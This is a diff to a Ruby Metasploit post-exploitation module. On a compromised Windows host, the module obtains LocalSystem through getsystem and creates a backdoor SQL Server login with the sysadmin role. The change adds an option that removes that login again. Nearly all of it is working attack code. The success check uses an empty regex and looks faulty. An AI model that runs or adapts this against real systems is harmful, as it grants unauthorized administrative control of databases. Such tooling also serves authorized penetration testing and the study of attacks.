@@ -29,25 +29,23 @@ class Metasploit3 < Msf::Post
 			[
 				OptString.new('DB_USERNAME',  [true, 'New sysadmin login', '']),
 				OptString.new('DB_PASSWORD',  [true, 'Password for new sysadmin login', '']),
-				OptBool.new('VERBOSE',  [false, 'Set how verbose the output should be', '']),
+				OptBool.new('_REMOVE_LOGIN',  [false, 'Remove DB_USERNAME login from database', 'false']),
+				OptBool.new('_VERBOSE',  [false, 'Set how verbose the output should be', 'false']),
 			], self.class)
 	end
 	
 	# TODO
-	# - forward sql server error message to output
+	# - add remove login
+	# - add instance option
 
 	def run
 			
 		# Set Verbosity level
-		verbose = datastore['verbose'].to_s.downcase 
+		verbose = datastore['_verbose'].to_s.downcase 
 		
 		# Display target
 		print_status("Running module against #{sysinfo['Computer']}")	
 	
-		##
-		## Add NEW SYSADMIN
-		##
-		
 		# Get LocalSystem privileges		
 		print_status("Attempting to obtain LocalSystem privileges...") if verbose == "true"
 		system_status = session.priv.getsystem
@@ -63,17 +61,25 @@ class Metasploit3 < Msf::Post
 				print_status("Checking for native client...") if verbose == "true"
 				sql_client = get_sql_client()				
 				if sql_client != 0
-					
-					# Add new login
-					print_status("Attempting to add new login #{datastore['DB_USERNAME']}...") if verbose == "true"
-					add_login_status = add_sql_login(sql_client,datastore['DB_USERNAME'],datastore['DB_PASSWORD'],verbose)
-					if add_login_status == 1
+				
+					# Check if remove_login was selected
+					if datastore['_REMOVE_LOGIN'].to_s.downcase == "false"
+											
+						# Add new login
+						print_status("Attempting to add new login #{datastore['DB_USERNAME']}...") if verbose == "true"
+						add_login_status = add_sql_login(sql_client,datastore['DB_USERNAME'],datastore['DB_PASSWORD'],verbose)
+						if add_login_status == 1
+							
+							# Add login to sysadmin fixed server role
+							print_status("Attempting to make #{datastore['DB_USERNAME']} login a sysadmin...") if verbose == "true"
+							add_sysadmin(sql_client,datastore['DB_USERNAME'],datastore['DB_PASSWORD'],verbose)				
+						end
+					else
 						
-						# Add login to sysadmin fixed server role
-						print_status("Attempting to make #{datastore['DB_USERNAME']} login a sysadmin...") if verbose == "true"
-						add_sysadmin(sql_client,datastore['DB_USERNAME'],datastore['DB_PASSWORD'],verbose)
-						
+						# Remove login
+						remove_sql_login(sql_client,datastore['DB_USERNAME'],verbose)
 					end
+					
 				end
 			end
 		else
@@ -83,7 +89,7 @@ class Metasploit3 < Msf::Post
 	end
 	
 	
-	# Method to check if the SQL Server service is running
+	## Method to check if the SQL Server service is running
 	def check_for_sqlserver
 	
 		# Get Data
@@ -108,7 +114,8 @@ class Metasploit3 < Msf::Post
 		return 0
 	end
 
-	# Method for identifying which SQL client to use
+	
+	## Method for identifying which SQL client to use
 	def get_sql_client
 	
 		# Get Data - osql
@@ -144,7 +151,7 @@ class Metasploit3 < Msf::Post
 		return 0
 	end
 
-	# Method for adding a login
+	## Method for adding a login
 	def add_sql_login(sqlclient,dbuser,dbpass,verbose)
 		
 		# Display debugging information
@@ -210,22 +217,20 @@ class Metasploit3 < Msf::Post
 			end
 		end	
 		
-		if check == 1		
-		
-			print_good("Successfully added #{dbuser} to sysadmin role")
-			return 1
-			
-		else 
-		
+		# Display results to user
+		if check == 1				
+			print_good("Successfully added \"#{dbuser}\" to sysadmin role")
+			return 1			
+		else 		
 			# Fail
 			print_error("Unabled to add #{dbuser} to sysadmin role")
 			print_error("Database Error:\n #{add_login_result}")
-			return 0
-			
+			return 0		
 		end
 	end
+
 	
-	# Method for removing login
+	## Method for removing login
 	def remove_sql_login(sqlclient,dbuser,verbose)
 		
 		# Display debugging information
@@ -239,30 +244,26 @@ class Metasploit3 < Msf::Post
 		remove_login_result = run_cmd("#{sqlclient} -E -S #{sysinfo['Computer']} -Q \"sp_droplogin '#{dbuser}'\"")
 		
 		# Parse Data 
-		add_remove_array = add_remove_result.split("\n")
+		remove_login_array = remove_login_result.split("\n")
 		
 		# Check for success
 		check = 0
-		add_remove_array.each do |service|
+		remove_login_array.each do |service|
 			if service =~ // then
 					check = 1
 			end
 		end	
 		
-		if check == 0	
-		
+		# Display result
+		if check == 0			
 			print_good("Successfully removed login \"#{dbuser}\"")	
-			return 1
-			
-		else 
-		
+			return 1			
+		else 		
 			# Fail
 			print_error("Unabled to remove login #{dbuser}")
-			print_error("Database Error:\n #{add_login_result}")
-			return 0
-			
+			print_error("Database Error:\n #{remove_login_result}")
+			return 0			
 		end
-
 	end
 		
 	# Method for executing cmd and returning the response
